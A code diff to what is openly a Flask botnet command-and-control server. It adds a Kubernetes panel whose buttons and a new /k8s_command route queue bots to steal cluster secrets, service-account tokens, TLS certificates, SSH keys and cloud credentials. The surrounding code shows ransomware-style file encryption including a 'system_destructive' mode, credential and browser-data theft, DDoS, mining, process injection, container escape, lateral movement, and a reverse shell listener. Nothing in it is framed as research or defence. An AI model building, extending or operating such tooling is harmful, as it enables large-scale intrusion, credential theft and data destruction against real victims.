@@ -260,6 +260,7 @@ def admin_panel():
             .encryption-btn { background: #ff6600; }
             .advanced-btn { background: #8a2be2; }
             .cloud-btn { background: #2b8a8a; }
+            .k8s-btn { background: #326ce5; }
             .tab-container { display: flex; border-bottom: 1px solid #444; margin-bottom: 20px; }
             .tab { padding: 10px 20px; cursor: pointer; border: 1px solid transparent; }
             .tab.active { background: #222; border: 1px solid #444; border-bottom: none; }
@@ -272,6 +273,7 @@ def admin_panel():
             .warning-box { background: #3a1a1a; border: 2px solid #ff3333; padding: 15px; margin: 15px 0; }
             .advanced-box { background: #1a1a3a; border: 2px solid #8a2be2; padding: 15px; margin: 15px 0; }
             .cloud-box { background: #1a2a3a; border: 2px solid #2b8a8a; padding: 15px; margin: 15px 0; }
+            .k8s-box { background: #1a1a3a; border: 2px solid #326ce5; padding: 15px; margin: 15px 0; }
         </style>
     </head>
     <body>
@@ -287,6 +289,7 @@ def admin_panel():
                 <div class="tab" onclick="switchTab('payloads')"> Payloads</div>
                 <div class="tab" onclick="switchTab('advanced')"> Advanced</div>
                 <div class="tab" onclick="switchTab('cloud')"> Cloud Ops</div>
+                <div class="tab" onclick="switchTab('k8s')"> Kubernetes</div>
                 <div class="tab" onclick="switchTab('results')"> Results</div>
                 <div class="tab" onclick="switchTab('server')"> Server Status</div>
             </div>
@@ -346,7 +349,10 @@ def admin_panel():
                                 <option value="trigger_gcp_creds">GCP Creds</option>
                                 <option value="trigger_gcp_enum">GCP Enum</option>
                                 <option value="trigger_container_escape">Container Escape</option>
-                                <option value="trigger_k8s_creds">K8s Creds</option>
+                                <!-- KUBERNETES TRIGGERS -->
+                                <option value="trigger_k8s_creds">K8s Credentials</option>
+                                <option value="trigger_k8s_steal">K8s Secret Steal</option>
+                                <option value="trigger_k8s_target">K8s Targeted Steal</option>
                                 <!-- FILE ENCRYPTION OPTIONS -->
                                 <option value="trigger_fileransom encrypt /home/user/Documents">Encrypt Documents</option>
                                 <option value="trigger_fileransom encrypt /home/user/Downloads">Encrypt Downloads</option>
@@ -388,6 +394,47 @@ def admin_panel():
                         {% endif %}
                     </div>
                     {% endfor %}
+                    
+                    <!-- KUBERNETES SPECIAL SECTION -->
+                    <div class="section k8s-box">
+                        <h3 style="color: #326ce5;">⚙️ Kubernetes Secret Stealer</h3>
+                        <p><small>Steal Kubernetes secrets, configs, tokens, and certificates from compromised containers</small></p>
+                        
+                        <div class="button-group">
+                            <button class="k8s-btn" onclick="sendToBot(selectedBotId(), 'trigger_k8s_steal')">Steal All Secrets</button>
+                            <button class="k8s-btn" onclick="showK8sTargetForm()">Targeted Steal</button>
+                            <button class="k8s-btn" onclick="sendToBot(selectedBotId(), 'load_payload k8s_secret_stealer.py')">Load Payload</button>
+                            <button class="k8s-btn" onclick="sendToBot(selectedBotId(), 'run_payload k8s_secret_stealer.py')">Run Payload</button>
+                        </div>
+                        
+                        <div id="k8s-target-form" style="display: none; margin-top: 15px; padding: 15px; background: #0a0a0a; border: 1px solid #326ce5;">
+                            <h4>Targeted Kubernetes Secret Stealing</h4>
+                            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
+                                <div>
+                                    <label>Namespace:</label>
+                                    <input type="text" id="k8s_namespace" placeholder="default" style="width: 100%;">
+                                </div>
+                                <div>
+                                    <label>Secret Name (optional):</label>
+                                    <input type="text" id="k8s_secret" placeholder="Leave empty for all secrets" style="width: 100%;">
+                                </div>
+                            </div>
+                            <div style="margin-top: 10px;">
+                                <button onclick="executeK8sTargeted()" style="background: #326ce5;">Execute Targeted Steal</button>
+                                <button onclick="hideK8sTargetForm()" style="background: #666;">Cancel</button>
+                            </div>
+                        </div>
+                        
+                        <div style="margin-top: 10px; font-size: 12px; color: #aaa;">
+                            <strong>Features:</strong><br>
+                            • <strong>Complete Secret Dump</strong>: Extract all secrets from all namespaces<br>
+                            • <strong>Targeted Extraction</strong>: Steal specific secrets from specific namespaces<br>
+                            • <strong>Token Harvesting</strong>: Collect service account tokens<br>
+                            • <strong>Certificate Extraction</strong>: Steal TLS certificates<br>
+                            • <strong>ConfigMap Collection</strong>: Gather configuration data<br>
+                            • <strong>SSH Key Harvesting</strong>: Extract SSH keys from pods
+                        </div>
+                    </div>
                     
                     <!-- ADVANCED PAYLOADS SECTION -->
                     <div class="section advanced-box">
@@ -479,6 +526,15 @@ def admin_panel():
                         <button class="recon-btn" onclick="sendToAll('trigger_browsersteal')">Browser Data</button>
                         <button class="recon-btn" onclick="sendToAll('trigger_dumpcreds')">Dump Creds</button>
                         <button class="recon-btn" onclick="sendToAll('trigger_network_scan')">Network Scan</button>
+                    </div>
+                </div>
+                
+                <div class="section">
+                    <h2> Kubernetes Operations</h2>
+                    <div class="button-group">
+                        <button class="k8s-btn" onclick="sendToAll('trigger_k8s_steal')">Steal All K8s Secrets</button>
+                        <button class="k8s-btn" onclick="sendToAll('load_payload k8s_secret_stealer.py')">Load K8s Stealer</button>
+                        <button class="k8s-btn" onclick="sendToAll('run_payload k8s_secret_stealer.py')">Run K8s Stealer</button>
                     </div>
                 </div>
                 
@@ -703,11 +759,12 @@ def admin_panel():
                             <button onclick="sendToAll('load_payload container_escape.py')">Load</button>
                             <button onclick="sendToAll('run_payload container_escape.py')" style="background: #2b8a8a;">Run</button>
                         </div>
-                        <div class="bot cloud-box">
-                            <strong style="color: #2b8a8a;">Kubernetes Secret Stealer</strong>
-                            <p><small> Steal Kubernetes secrets and configs</small></p>
+                        <!-- KUBERNETES PAYLOADS -->
+                        <div class="bot k8s-box">
+                            <strong style="color: #326ce5;">Kubernetes Secret Stealer</strong>
+                            <p><small> Steal Kubernetes secrets, tokens, and certificates</small></p>
                             <button onclick="sendToAll('load_payload k8s_secret_stealer.py')">Load</button>
-                            <button onclick="sendToAll('run_payload k8s_secret_stealer.py')" style="background: #2b8a8a;">Run</button>
+                            <button onclick="sendToAll('run_payload k8s_secret_stealer.py')" style="background: #326ce5;">Run</button>
                         </div>
                         <!-- END NEW PAYLOADS -->
                         <div class="bot" style="border: 2px solid #ff6600;">
@@ -884,6 +941,109 @@ def admin_panel():
                 </div>
             </div>
             
+            <!-- KUBERNETES TAB -->
+            <div id="k8s-tab" class="tab-content">
+                <div class="section k8s-box">
+                    <h2 style="color: #326ce5;">⚙️ Kubernetes Operations</h2>
+                    <p>Specialized tools for Kubernetes cluster exploitation and secret stealing</p>
+                    
+                    <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 15px; margin-top: 20px;">
+                        <div class="bot">
+                            <h3 style="color: #326ce5;">Complete Secret Stealing</h3>
+                            <p><small>Steal ALL secrets, tokens, certificates, and configurations from the entire Kubernetes cluster</small></p>
+                            <div class="button-group">
+                                <button onclick="sendToBot(selectedBotId(), 'trigger_k8s_steal')" style="background: #326ce5;">Steal All Secrets</button>
+                                <button onclick="sendToBot(selectedBotId(), 'load_payload k8s_secret_stealer.py')">Load Stealer</button>
+                                <button onclick="sendToBot(selectedBotId(), 'run_payload k8s_secret_stealer.py')">Run Stealer</button>
+                            </div>
+                            <div style="font-size: 12px; color: #aaa; margin-top: 10px;">
+                                <strong>Scope:</strong><br>
+                                • All namespaces<br>
+                                • All secrets<br>
+                                • Service account tokens<br>
+                                • TLS certificates<br>
+                                • SSH keys from pods<br>
+                                • ConfigMaps<br>
+                                • Persistent volumes
+                            </div>
+                        </div>
+                        
+                        <div class="bot">
+                            <h3 style="color: #326ce5;">Targeted Secret Extraction</h3>
+                            <p><small>Steal specific secrets from specific namespaces</small></p>
+                            <div class="command-form">
+                                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 10px;">
+                                    <div>
+                                        <label>Namespace:</label>
+                                        <input type="text" id="k8s_target_namespace" placeholder="default" style="width: 100%;">
+                                    </div>
+                                    <div>
+                                        <label>Secret Name (optional):</label>
+                                        <input type="text" id="k8s_target_secret" placeholder="Leave empty for all secrets" style="width: 100%;">
+                                    </div>
+                                </div>
+                                <div class="button-group">
+                                    <button onclick="executeK8sTargeted()" style="background: #326ce5;">Execute Targeted</button>
+                                    <button onclick="sendToAll('trigger_k8s_target default')" style="background: #2a5ac5;">Default Namespace</button>
+                                    <button onclick="sendToAll('trigger_k8s_target kube-system')" style="background: #2450b5;">kube-system</button>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="bot">
+                            <h3 style="color: #326ce5;">Advanced Kubernetes Operations</h3>
+                            <p><small>Advanced Kubernetes exploitation techniques</small></p>
+                            <div class="button-group">
+                                <button onclick="sendToBot(selectedBotId(), 'trigger_k8s_creds')" style="background: #326ce5;">Steal Credentials</button>
+                                <button onclick="sendToBot(selectedBotId(), 'load_payload k8s_privilege_escalation.py')" style="background: #2a5ac5;">Privilege Escalation</button>
+                                <button onclick="sendToBot(selectedBotId(), 'load_payload k8s_lateral_move.py')" style="background: #2450b5;">Lateral Movement</button>
+                            </div>
+                        </div>
+                        
+                        <div class="bot">
+                            <h3 style="color: #326ce5;">Kubernetes Reconnaissance</h3>
+                            <p><small>Gather intelligence about the Kubernetes cluster</small></p>
+                            <div class="button-group">
+                                <button onclick="sendK8sRecon('cluster')" style="background: #326ce5;">Cluster Info</button>
+                                <button onclick="sendK8sRecon('nodes')" style="background: #2a5ac5;">Nodes</button>
+                                <button onclick="sendK8sRecon('pods')" style="background: #2450b5;">Pods</button>
+                                <button onclick="sendK8sRecon('services')" style="background: #1e4699;">Services</button>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="section" style="margin-top: 30px;">
+                        <h3>Kubernetes Secret Types</h3>
+                        <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 10px; margin-top: 15px;">
+                            <div style="background: #0a0a0a; padding: 10px; border: 1px solid #326ce5;">
+                                <strong style="color: #326ce5;">Service Tokens</strong>
+                                <div style="font-size: 11px; color: #aaa;">Authentication tokens for services</div>
+                            </div>
+                            <div style="background: #0a0a0a; padding: 10px; border: 1px solid #326ce5;">
+                                <strong style="color: #326ce5;">TLS Certificates</strong>
+                                <div style="font-size: 11px; color: #aaa;">SSL/TLS certificates for services</div>
+                            </div>
+                            <div style="background: #0a0a0a; padding: 10px; border: 1px solid #326ce5;">
+                                <strong style="color: #326ce5;">Docker Registry</strong>
+                                <div style="font-size: 11px; color: #aaa;">Container registry credentials</div>
+                            </div>
+                            <div style="background: #0a0a0a; padding: 10px; border: 1px solid #326ce5;">
+                                <strong style="color: #326ce5;">SSH Keys</strong>
+                                <div style="font-size: 11px; color: #aaa;">SSH keys for pod access</div>
+                            </div>
+                            <div style="background: #0a0a0a; padding: 10px; border: 1px solid #326ce5;">
+                                <strong style="color: #326ce5;">API Tokens</strong>
+                                <div style="font-size: 11px; color: #aaa;">Kubernetes API access tokens</div>
+                            </div>
+                            <div style="background: #0a0a0a; padding: 10px; border: 1px solid #326ce5;">
+                                <strong style="color: #326ce5;">Cloud Credentials</strong>
+                                <div style="font-size: 11px; color: #aaa;">AWS/Azure/GCP cloud credentials</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
             <!-- RESULTS TAB -->
             <div id="results-tab" class="tab-content">
                 <div class="section">
@@ -918,6 +1078,7 @@ def admin_panel():
                     <p><strong>Pending Commands:</strong> {{ pending_count }}</p>
                     <p><strong>Advanced Payloads:</strong> 4 (New)</p>
                     <p><strong>Cloud Payloads:</strong> 5 (New)</p>
+                    <p><strong>Kubernetes Payloads:</strong> 1 (New - k8s_secret_stealer.py)</p>
                     <p><strong>Uptime:</strong> <span id="uptime">Calculating...</span></p>
                     
                     <h3> Quick Actions</h3>
@@ -939,6 +1100,7 @@ def admin_panel():
                 <button onclick="document.getElementById('manual_cmd').value = 'trigger_status'">Insert Status</button>
                 <button onclick="document.getElementById('manual_cmd').value = 'trigger_procinject'" style="background: #8a2be2;">Insert Process Inject</button>
                 <button onclick="document.getElementById('manual_cmd').value = 'trigger_cloud_detect'" style="background: #2b8a8a;">Insert Cloud Detect</button>
+                <button onclick="document.getElementById('manual_cmd').value = 'trigger_k8s_steal'" style="background: #326ce5;">Insert K8s Steal</button>
                 <button onclick="document.getElementById('manual_cmd').value = 'trigger_fileransom encrypt /home/user/Documents'" style="background: #ff6600;">Insert File Encrypt</button>
                 <button onclick="document.getElementById('manual_cmd').value = 'trigger_fileransom encrypt all'" style="background: #ff5500;">Insert Encrypt All</button>
                 <button onclick="document.getElementById('manual_cmd').value = 'trigger_fileransom encrypt system_destructive'" style="background: #ff0000; color: white;">Insert System Destructive</button>
@@ -1169,6 +1331,39 @@ def admin_panel():
                 });
             }
             
+            // KUBERNETES FUNCTIONS
+            function showK8sTargetForm() {
+                document.getElementById('k8s-target-form').style.display = 'block';
+            }
+            
+            function hideK8sTargetForm() {
+                document.getElementById('k8s-target-form').style.display = 'none';
+            }
+            
+            function executeK8sTargeted() {
+                var namespace = document.getElementById('k8s_namespace').value || 'default';
+                var secret = document.getElementById('k8s_secret').value;
+                
+                var cmd = 'trigger_k8s_target ' + namespace;
+                if (secret) {
+                    cmd += ' ' + secret;
+                }
+                
+                var selectedBot = selectedBotId();
+                if (!selectedBot) return;
+                
+                sendToBot(selectedBot, cmd);
+                hideK8sTargetForm();
+            }
+            
+            function sendK8sRecon(type) {
+                var cmd = 'trigger_k8s_recon ' + type;
+                var selectedBot = selectedBotId();
+                if (!selectedBot) return;
+                
+                sendToBot(selectedBot, cmd);
+            }
+            
             // FILE ENCRYPTION FUNCTIONS
             function sendFileransomCommand() {
                 var action = document.getElementById('fileransom_action').value;
@@ -1390,30 +1585,34 @@ def add_command():
         print(f"[-] Command error: {e}")
         return jsonify({'error': str(e)}), 500
 
-@app.route('/cloud_command', methods=['POST'])
-def cloud_command():
-    """Send cloud-specific command"""
+@app.route('/k8s_command', methods=['POST'])
+def k8s_command():
+    """Send Kubernetes-specific command"""
     try:
         data = request.json
         beacon_id = data.get('beacon_id')
         command = data.get('command')
+        namespace = data.get('namespace', 'default')
+        secret = data.get('secret', '')
         
         if not beacon_id or not command:
             return jsonify({'error': 'Missing beacon_id or command'}), 400
         
-        # Map cloud commands to actual triggers
-        command_map = {
-            'cloud_detect': 'run_payload cloud_detector.py',
-            'aws_creds': 'run_payload aws_credential_stealer.py',
-            'azure_creds': 'run_payload azure_cred_harvester.py',
-            'container_escape': 'run_payload container_escape.py',
-            'cloud_recon': 'trigger_cloud_recon',
-        }
+        # Build the command
+        if command == 'steal_all':
+            actual_command = 'trigger_k8s_steal'
+        elif command == 'targeted':
+            actual_command = f'trigger_k8s_target {namespace}'
+            if secret:
+                actual_command += f' {secret}'
+        elif command == 'creds':
+            actual_command = 'trigger_k8s_creds'
+        else:
+            actual_command = command
         
-        actual_command = command_map.get(command, command)
         pending_commands[beacon_id].append(actual_command)
         
-        print(f"[CLOUD] Cloud command queued for {beacon_id}: {command} -> {actual_command}")
+        print(f"[K8S] Kubernetes command queued for {beacon_id}: {actual_command}")
         
         return jsonify({
             'status': 'queued',
@@ -1422,7 +1621,7 @@ def cloud_command():
         })
         
     except Exception as e:
-        print(f"[-] Cloud command error: {e}")
+        print(f"[-] Kubernetes command error: {e}")
         return jsonify({'error': str(e)}), 500
 
 @app.route('/clear_pending/<bot_id>', methods=['POST'])
@@ -1485,6 +1684,7 @@ def list_payloads():
             .warning {{ border: 2px solid #ff6600; background: #3a1a1a; }}
             .advanced {{ border: 2px solid #8a2be2; background: #1a1a3a; }}
             .cloud {{ border: 2px solid #2b8a8a; background: #1a2a3a; }}
+            .k8s {{ border: 2px solid #326ce5; background: #1a1a3a; }}
         </style>
     </head>
     <body>
@@ -1492,6 +1692,7 @@ def list_payloads():
         <p><strong>Total Payloads:</strong> {len([f for f in files if f.endswith('.py')])}</p>
         <p><strong>Advanced Payloads (NEW):</strong> 4</p>
         <p><strong>Cloud Payloads (NEW):</strong> 5</p>
+        <p><strong>Kubernetes Payloads (NEW):</strong> 1 (k8s_secret_stealer.py)</p>
         <ul>
     """
     
@@ -1507,7 +1708,8 @@ def list_payloads():
         'Impact': ['ddos.py', 'mine.py', 'fileransom.py'],
         'Persistence': ['polyloader.py'],
         'Advanced (NEW)': ['process_inject.py', 'advanced_filehider.py', 'advanced_cron_persistence.py', 'competitor_cleaner.py'],
-        'Cloud (NEW)': ['cloud_detector.py', 'aws_credential_stealer.py', 'azure_cred_harvester.py', 'container_escape.py', 'k8s_secret_stealer.py']
+        'Cloud (NEW)': ['cloud_detector.py', 'aws_credential_stealer.py', 'azure_cred_harvester.py', 'container_escape.py'],
+        'Kubernetes (NEW)': ['k8s_secret_stealer.py']
     }
     
     for category, payloads in payload_categories.items():
@@ -1518,8 +1720,10 @@ def list_payloads():
                     warning_class = 'warning'
                 elif payload in ['process_inject.py', 'advanced_filehider.py', 'advanced_cron_persistence.py', 'competitor_cleaner.py']:
                     warning_class = 'advanced'
-                elif payload in ['cloud_detector.py', 'aws_credential_stealer.py', 'azure_cred_harvester.py', 'container_escape.py', 'k8s_secret_stealer.py']:
+                elif payload in ['cloud_detector.py', 'aws_credential_stealer.py', 'azure_cred_harvester.py', 'container_escape.py']:
                     warning_class = 'cloud'
+                elif payload == 'k8s_secret_stealer.py':
+                    warning_class = 'k8s'
                 else:
                     warning_class = ''
                 
@@ -1531,7 +1735,8 @@ def list_payloads():
                         <a href="javascript:sendToAll(\\'load_payload {payload}\\')">Load</a> | 
                         <a href="javascript:sendToAll(\\'run_payload {payload}\\')">Run</a>
                         { ' | <span style="color:#8a2be2"> NEW</span>' if payload in ['process_inject.py', 'advanced_filehider.py', 'advanced_cron_persistence.py', 'competitor_cleaner.py'] else '' }
-                        { ' | <span style="color:#2b8a8a"> CLOUD</span>' if payload in ['cloud_detector.py', 'aws_credential_stealer.py', 'azure_cred_harvester.py', 'container_escape.py', 'k8s_secret_stealer.py'] else '' }
+                        { ' | <span style="color:#2b8a8a"> CLOUD</span>' if payload in ['cloud_detector.py', 'aws_credential_stealer.py', 'azure_cred_harvester.py', 'container_escape.py'] else '' }
+                        { ' | <span style="color:#326ce5"> KUBERNETES</span>' if payload == 'k8s_secret_stealer.py' else '' }
                     </div>
                 </li>
                 '''
@@ -1744,8 +1949,16 @@ def main():
     print(f"[SHELL] Reverse Shell: 0.0.0.0:9001")
     print(f"[PAYLOADS] Available at: {ngrok_url}/payloads/" if ngrok_url else f"[PAYLOADS] Available at: http://localhost:{C2_PORT}/payloads/")
     print(f"[ADVANCED] 4 New Payloads Added: Process Injection, File Hider, Cron Persist, Competitor Cleaner")
-    print(f"[CLOUD] 5 Cloud Payloads Added: Cloud Detector, AWS/Azure/GCP Stealers, Container Escape, K8s Stealer")
+    print(f"[CLOUD] 5 Cloud Payloads Added: Cloud Detector, AWS/Azure/GCP Stealers, Container Escape")
+    print(f"[KUBERNETES] 1 New Payload Added: k8s_secret_stealer.py")
     print(f"[FILE ENCRYPTION] System-wide modes: system_test, system_user, system_aggressive, system_destructive")
+    print(f"\n[K8S FEATURES]")
+    print(f"  • Complete secret extraction from all namespaces")
+    print(f"  • Targeted secret stealing by namespace")
+    print(f"  • Service account token harvesting")
+    print(f"  • TLS certificate extraction")
+    print(f"  • ConfigMap collection")
+    print(f"  • SSH key harvesting from pods")
     print("\n" + "="*60)
     
     # Start Flask server
